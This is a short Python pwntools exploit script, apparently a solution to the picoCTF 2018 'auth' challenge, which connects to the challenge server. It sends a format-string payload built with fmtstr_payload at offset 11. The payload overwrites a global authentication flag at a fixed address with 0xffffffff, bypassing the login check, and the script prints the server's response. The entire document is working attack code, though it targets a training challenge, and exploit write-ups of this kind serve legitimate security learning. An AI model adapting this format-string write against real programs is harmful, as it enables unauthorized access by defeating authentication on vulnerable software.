#! /usr/bin/env python
from pwn import context, remote, log
from pwn import fmtstr_payload
context.clear(arch='i386', os='linux', endian='little', word_size=32)


class ExploitInfo:
    host = '2018shell2.picoctf.com'
    port = 26336
    name = 'auth'
    #
    fmt_offset = 11
    g_authenticated_addr = 0x0804a04c


def main():
    p = remote(ExploitInfo.host, ExploitInfo.port)
    payload = fmtstr_payload(ExploitInfo.fmt_offset, {ExploitInfo.g_authenticated_addr: 0xffffffff})
    p.clean()
    p.sendline(payload)
    print(p.recvall())


if __name__ == "__main__":
    main()
